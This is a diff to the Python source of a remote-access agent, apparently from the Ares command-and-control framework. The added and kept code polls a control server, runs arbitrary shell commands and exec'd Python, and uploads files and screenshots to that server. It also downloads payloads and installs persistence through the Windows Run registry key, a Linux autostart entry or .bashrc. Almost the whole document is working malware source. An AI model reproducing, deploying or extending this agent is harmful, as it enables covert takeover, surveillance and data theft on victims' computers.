@@ -5,162 +5,49 @@ import requests
 import time
 import os
 import subprocess
-import json
-import base64
 import platform
 import shutil
 import sys
 import traceback
 import threading
 import uuid
+import StringIO
+import zipfile
+import tempfile
+import socket
+import getpass
+if os.name == 'nt':
+    from PIL import ImageGrab
+else:
+    import pyscreenshot as ImageGrab
 
 import config
+
+
+def threaded(func):
+    def wrapper(*_args, **kwargs):
+        t = threading.Thread(target=func, args=_args)
+        t.start()
+        return
+    return wrapper
 
 
 class Agent(object):
 
     def __init__(self):
-        self.platform = platform.system() + " " + platform.release()
         self.idle = True
+        self.silent = False
+        self.platform = platform.system() + " " + platform.release()
         self.last_active = time.time()
         self.failed_connections = 0
         self.uid = self.get_UID()
-
-    def log(self, to_log):
-        """ Write data to agent log """
-        print(to_log)
-
-    def get_UID(self):
-        return os.getlogin() + "_" + str(uuid.getnode())
-
-    def server_hello(self):
-        """ Ask server for instructions """
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
-            json={'platform': self.platform})
-        return req.text
-
-    def send_output(self, output, newlines=True):
-        """ Send console output to server """
-        if not output:
-            return
-        if newlines:
-            output += "\n\n"
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
-        data={'output': output})
-
-    def _runcmd(self, cmd):
-        try:
-            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            out, err = proc.communicate()
-            output = (out + err).decode('utf8')
-            self.send_output(output)
-        except Exception as exc:
-            self.send_output(traceback.format_exc())
-
-    def runcmd(self, cmd):
-        """ Run OS command """
-        t = threading.Thread(target=self._runcmd, args=(cmd,))
-        t.start()
-
-    def cd(self, directory):
-        """ Change current directory """
-        os.chdir(os.path.expandvars(os.path.expanduser(directory)))
-
-    def _upload(self, file):
-        """ Uploads local file to server """
-        file = os.path.expandvars(os.path.expanduser(file))
-        try:
-            if os.path.exists(file) and os.path.isfile(file):
-                self.send_output("Uploading %s..." % file)
-                requests.post(config.SERVER + '/api/' + self.uid + '/upload',
-                    files={'uploaded': open(file, 'rb')})
-            else:
-                self.send_output('No such file: ' + file)
-        except Exception as exc:
-            self.send_output(traceback.format_exc())
-
-    def upload(self, file):
-        t = threading.Thread(target=self._upload, args=(file,))
-        t.start()
-
-    def _download(self, file, destination):
-        try:
-            if not destination:
-                destination= file.split('/')[-1]
-            self.send_output("Downloading %s..." % file)
-            req = requests.get(file, stream=True)
-            with open(destination, 'wb') as f:
-                for chunk in req.iter_content(chunk_size=8000):
-                    if chunk:
-                        f.write(chunk)
-            self.send_output("File downloaded: " + destination)
-        except Exception as exc:
-            self.send_output(traceback.format_exc())
-
-    def download(self, file, destination=''):
-        """ Download file through HTTP """      
-        t = threading.Thread(target=self._download, args=(file, destination))
-        t.start()
-
-    def clean(self, silent=False):
-        """ Uninstalls the agent and exits """ 
-        if platform.system() == 'Linux':
-            persist_dir = os.path.expanduser('~/.ares')
-            if os.path.exists(persist_dir):
-                shutil.rmtree(persist_dir)
-            desktop_entry = os.path.expanduser('~/.config/autostart/ares.desktop')
-            if os.path.exists(desktop_entry):
-                os.remove(desktop_entry)
-        elif platform.system() == 'Windows':
-            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
-            if os.path.exists(persist_dir):
-                shutil.rmtree(persist_dir)
-            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
-            subprocess.Popen(cmd, shell=True)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s\"" % persist_dir
-            subprocess.Popen(cmd, shell=True)
-        if not silent:
-            self.send_output('Agent removed successfully.')
-        
-
-    def persist(self, silent=False):
-        if not getattr(sys, 'frozen', False):
-            if not silent:
-                self.send_output('Persistence only supported on compiled agents.')
-            return
-        if self.is_installed():
-            if not silent:
-                self.send_output('Agent seems to be already installed.')
-            return
-        if platform.system() == 'Linux':
-            persist_dir = os.path.expanduser('~/.ares')
-            if not os.path.exists(persist_dir):
-                os.makedirs(persist_dir)
-            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
-            shutil.copyfile(sys.executable, agent_path)
-            os.system('chmod +x ' + agent_path)
-            if os.path.exists(os.path.expanduser("~/.config/autostart/")):
-                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
-                with open(os.path.expanduser('~/.config/autostart/ares.desktop'), 'w') as f:
-                    f.write(desktop_entry)
-            else:
-                with open(os.path.expanduser("~/.bashrc"), "a") as f:
-                    f.write("\nif [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&\n")
-        elif platform.system() == 'Windows':
-            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
-            if not os.path.exists(persist_dir):
-                os.makedirs(persist_dir)
-            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
-            shutil.copyfile(sys.executable, agent_path)
-            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
-            subprocess.Popen(cmd, shell=True)
-        if not silent:
-            self.send_output('Agent installed.')
+        self.hostname = socket.gethostname()
+        self.username = getpass.getuser()
 
     def get_install_dir(self):
         install_dir = None
         if platform.system() == 'Linux':
-            install_dir = os.path.expanduser('~/.ares')
+            install_dir = self.expand_path('~/.ares')
         elif platform.system() == 'Windows':
             install_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
         if os.path.exists(install_dir):
@@ -192,18 +79,206 @@ class Agent(object):
         else:
             self.failed_connections = value
 
+    def log(self, to_log):
+        """ Write data to agent log """
+        print(to_log)
+
+    def get_UID(self):
+        """ Returns a unique ID for the agent """
+        return getpass.getuser() + "_" + str(uuid.getnode())
+
+    def server_hello(self):
+        """ Ask server for instructions """
+        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
+            json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
+        return req.text
+
+    def send_output(self, output, newlines=True):
+        """ Send console output to server """
+        if self.silent:
+            self.log(output)
+            return
+        if not output:
+            return
+        if newlines:
+            output += "\n\n"
+        req = requests.post(config.SERVER + '/api/' + self.uid + '/report', 
+        data={'output': output})
+
+    def expand_path(self, path):
+        """ Expand environment variables and metacharacters in a path """
+        return os.path.expandvars(os.path.expanduser(path))
+
+    @threaded
+    def runcmd(self, cmd):
+        """ Runs a shell command and returns its output """
+        try:
+            proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            out, err = proc.communicate()
+            output = (out + err).decode('utf8')
+            self.send_output(output)
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
+
+    @threaded
+    def python(self, command_or_file):
+        """ Runs a python command or a python file and returns the output """
+        new_stdout = StringIO.StringIO()
+        old_stdout = sys.stdout
+        sys.stdout = new_stdout
+        new_stderr = StringIO.StringIO()
+        old_stderr = sys.stderr
+        sys.stderr = new_stderr
+        if os.path.exists(command_or_file):
+            self.send_output("[*] Running python file...")
+            with open(command_or_file, 'r') as f:
+                python_code = f.read()
+                try:
+                    exec(python_code)
+                except Exception as exc:
+                    self.send_output(traceback.format_exc())
+        else:
+            self.send_output("[*] Running python command...")
+            try:
+                exec(command_or_file)
+            except Exception as exc:
+                self.send_output(traceback.format_exc())
+        sys.stdout = old_stdout
+        sys.stderr = old_stderr
+        self.send_output(new_stdout.getvalue() + new_stderr.getvalue())
+
+    def cd(self, directory):
+        """ Change current directory """
+        os.chdir(self.expand_path(directory))
+
+    @threaded
+    def upload(self, file):
+        """ Uploads a local file to the server """
+        file = self.expand_path(file)
+        try:
+            if os.path.exists(file) and os.path.isfile(file):
+                self.send_output("[*] Uploading %s..." % file)
+                requests.post(config.SERVER + '/api/' + self.uid + '/upload',
+                    files={'uploaded': open(file, 'rb')})
+            else:
+                self.send_output('[!] No such file: ' + file)
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
+
+    @threaded
+    def download(self, file, destination=''):
+        """ Downloads a file the the agent host through HTTP(S) """
+        try:
+            destination = self.expand_path(destination)
+            if not destination:
+                destination= file.split('/')[-1]
+            self.send_output("[*] Downloading %s..." % file)
+            req = requests.get(file, stream=True)
+            with open(destination, 'wb') as f:
+                for chunk in req.iter_content(chunk_size=8000):
+                    if chunk:
+                        f.write(chunk)
+            self.send_output("[+] File downloaded: " + destination)
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
+
+    def persist(self):
+        """ Installs the agent """
+        if not getattr(sys, 'frozen', False):
+            self.send_output('[!] Persistence only supported on compiled agents.')
+            return
+        if self.is_installed():
+            self.send_output('[!] Agent seems to be already installed.')
+            return
+        if platform.system() == 'Linux':
+            persist_dir = self.expand_path('~/.ares')
+            if not os.path.exists(persist_dir):
+                os.makedirs(persist_dir)
+            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
+            shutil.copyfile(sys.executable, agent_path)
+            os.system('chmod +x ' + agent_path)
+            if os.path.exists(self.expand_path("~/.config/autostart/")):
+                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=Ares\nExec=%s\n" % agent_path
+                with open(self.expand_path('~/.config/autostart/ares.desktop'), 'w') as f:
+                    f.write(desktop_entry)
+            else:
+                with open(self.expand_path("~/.bashrc"), "a") as f:
+                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
+        elif platform.system() == 'Windows':
+            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+            if not os.path.exists(persist_dir):
+                os.makedirs(persist_dir)
+            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
+            shutil.copyfile(sys.executable, agent_path)
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares /t REG_SZ /d \"%s\"" % agent_path
+            subprocess.Popen(cmd, shell=True)
+        self.send_output('[+] Agent installed.')
+
+    def clean(self):
+        """ Uninstalls the agent """ 
+        if platform.system() == 'Linux':
+            persist_dir = self.expand_path('~/.ares')
+            if os.path.exists(persist_dir):
+                shutil.rmtree(persist_dir)
+            desktop_entry = self.expand_path('~/.config/autostart/ares.desktop')
+            if os.path.exists(desktop_entry):
+                os.remove(desktop_entry)
+        elif platform.system() == 'Windows':
+            persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
+            cmd = "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v ares"
+            subprocess.Popen(cmd, shell=True)
+            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /f /v ares /t REG_SZ /d \"cmd.exe /c del /s /q %s & rmdir %s\"" % (persist_dir, persist_dir)
+            subprocess.Popen(cmd, shell=True)
+        self.send_output('[+] Agent removed successfully.')
+
     def exit(self):
+        """ Kills the agent """
+        self.send_output('[+] Exiting... (bye!)')
         sys.exit(0)
+
+    @threaded
+    def zip(self, zip_name, to_zip):
+        """ Zips a folder or file """
+        zip_name = self.expand_path(zip_name)
+        to_zip = self.expand_path(to_zip)
+        if not os.path.exists(to_zip):
+            self.send_output("[+] No such file or directory: %s" % to_zip)
+            return
+        self.send_output("[*] Creating zip archive...")
+        zip_file = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
+        for root, dirs, files in os.walk(to_zip):
+            for file in files:
+                zip_file.write(os.path.join(root, file))
+        zip_file.close()
+        self.send_output("[+] Archive created: %s" % zip_name)
+   
+    @threaded
+    def screenshot(self):
+        """ Takes a screenshot and uploads it to the server"""
+        screenshot = ImageGrab.grab()
+        tmp_file = tempfile.NamedTemporaryFile()
+        screenshot_file = tmp_file.name + ".png"
+        tmp_file.close()
+        screenshot.save(screenshot_file)
+        self.upload(screenshot_file)
+
+    def help(self):
+        """ Displays the help """
+        self.send_output(config.HELP)
 
     def run(self):
         """ Main loop """
-        try:
-            self.persist(silent=True)
-        except:
-            self.log("Failed executing persistence")
+        self.silent = True
+        if config.PERSIST:
+            try:
+                self.persist()
+            except:
+                self.log("Failed executing persistence")
+        self.silent = False
         while True:
             try:
                 todo = self.server_hello()
+                self.update_consecutive_failed_connections(0)
                 # Something to do ?
                 if todo:
                     commandline = todo
@@ -240,6 +315,20 @@ class Agent(object):
                             self.persist()
                         elif command == 'exit':
                             self.exit()
+                        elif command == 'zip':
+                            if not args or len(args) < 2:
+                                self.send_output('usage: zip <archive_name> <folder>')
+                            else:
+                                self.zip(args[0], " ".join(args[1:]))
+                        elif command == 'python':
+                            if not args:
+                                self.send_output('usage: python <python_file> or python <python_command>')
+                            else:
+                                self.python(" ".join(args))
+                        elif command == 'screenshot':
+                            self.screenshot()
+                        elif command == 'help':
+                            self.help()
                         else:
                             self.runcmd(commandline)
                     except Exception as exc:
@@ -257,16 +346,17 @@ class Agent(object):
                 failed_connections = self.get_consecutive_failed_connections()
                 failed_connections += 1
                 self.update_consecutive_failed_connections(failed_connections)
-                print "Consecutive failed connections: %d" % failed_connections
+                self.log("Consecutive failed connections: %d" % failed_connections)
                 if failed_connections > config.MAX_FAILED_CONNECTIONS:
-                    self.clean(silent=True)
+                    self.silent = True
+                    self.clean()
                     self.exit()
                 time.sleep(config.HELLO_INTERVAL)
 
 def main():
     agent = Agent()
+    agent.help()
     agent.run()
-
 
 if __name__ == "__main__":
     main()
